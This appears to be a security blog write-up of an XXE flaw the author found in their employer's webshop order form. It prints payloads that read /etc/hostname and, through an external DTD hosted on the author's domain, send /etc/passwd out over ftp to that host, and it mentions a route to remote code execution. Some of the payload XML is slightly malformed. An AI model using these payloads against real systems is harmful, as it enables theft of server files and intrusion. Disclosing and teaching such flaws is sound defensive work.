---
layout: post
title: "Exploiting XXE to gain LFI"
date: 2020-07-19
---

## Topic
Today I'd like to talk to you about a vulnerability I've found some years ago in our webshop application.  
The application itself is nothing fancy. It's just a form which creates an order with the XML attributes you submit to it.

## Structure
The UI doesn't really look appealing or UX-friendly, but it's the backend that we're interested   
![Offlinebestellung](/assets/images/offlinebestellung.png "Offlinebestellung")

From our documentation I knew how the XML-File needs to be structured to be valid.
```
<ORDERIN>
  <KOPF>
    <Sender>Customer Nr.</Sender>
    <KopfText1>n/a</KopfText1>
    <IhrZeichen>n/a</IhrZeichen>
    <Bestelldatum>12.07.2020</Bestelldatum>
    <Lieferdatum>13.07.2020</Lieferdatum>
    <KopfKommission>
      <Kommission>Commission Nr.</Kommission>
    </KopfKommission>
  </KOPF>
  <POSITION>
      <Artikel-Nr>Article Nr.</Artikel-Nr>
      <BestellMenge>quantity</BestellMenge>
      <Postext>
        <Texte>n/a</Texte>
      </Postext>
  </POSITION>
</ORDERIN>
```

## The vulnerability
Many XML-Parsing libraries aren't configured correctly and let you define External Entities.  
Which in itself aren't that useless. They let you, for example, define structure of legal elements and attributes for your XML (also known as Document Type Definition - dtd.)

The vulnerability itself is called XXE (XML External Entity) - [Read more
here](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

It turned out that the XML-Parser wasn't configured at all. DTD and external entities were allowed (even to foreign addresses).


### Recon 
I've tried some elements to see if they would give me any sort of feedback.
Most of them failed with the following message:  
<img src="/assets/images/xxe-failed.png" width="450px">

After some trial and error I've found that the elements <Kommission> and <IhrZeichen> were valid payload holders.

### Getting the hostname
For basic stuff you don't need some fancy dtd stuff. 
```
<?xml version=1.2" encoding="ISO-8859-1"> ?>
<!DOCTYPE foo [ <!ELEMENT foo ANY> 
<!ENTITY xxe SYSTEM "file://etc//hostname" >]>
...
      <Kommission>&xxe;</Kommission>
...
```

This request returned the following result:  (hostname of the server)  
![Hostname](/assets/images/hostname.png "blackend for reasons.."

Getting the hostname of a server is already pretty great.
But currently we can just report a LFI vulnerability.

### Grabbing interesting stuff
The problem with the reflected XXE is, that we can just rely on the max input settings of the HTML/XML form.
There was no way to return more than one line (cause of \r\n chars).   
If you can't reflect something, why not just redirect the output somewhere else?

Multiple protocols can be misused to do just this. (Like finger (lol) or
http/ftp).  
Without much playing around I've decided to use ftp to grab data from files with more than one line.

There's no magic behind it. I just spun up a quick ftp server and listened for incoming traffic and also alter the XML.

Reading files is quite simple. All I had to do, is setting up a HTTP server with a **.dtd** file  
in its root directory and wait for the victim to pick it up and process it.

```
python -m 'SimpleHTTPServer'
```
DTD File:
```
<!ENTITY % a SYSTEM "file:///etc/passwd">
<!ENTITY % b "<!ENTITY ftp SYSTEM 'ftp://i-401.xyz/%a;'>"
```
XML:
```
<?xml version=1.2" encoding="ISO-8859-1"> ?>
<DOCTYPE XXE [
<!ENTITY % dtd SYSTEM "http://i-401.xyz/xxe.dtd"
...
<IhrName1>%dtd;</IhrName1>
<Kommission>%ftp;</Kommssion>
```

I used the following ruby ftp stub to extract the passwd file.  
[xxe-ftp-server](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)

If everything worked correctly, I should now see the content of /etc/passwd in my ftp logs.  
<img src="/assets/images/passwd.png" width="150px">

### How to get RCE
XXE is a well documented vulnerability and lot of resources are out there for gaining RCE.
I've decided that all I needed was proof that I can ship data from the server without compromising it.

To gain RCE you need to pray to your god(s) that the php expect module is activated.  
[PHP expect module](https://www.php.net/manual/de/book.expect.php)

It isn't on by default and so you most likely at a disadvantage.

## Conclusion
- Disable External Entities if not needed.  
- If needed - whitelist the sites hosting dtd.
- Firewall your Servers

Always test your own servers before the baddies do. :)


## Reward
A cold and wet handshake.



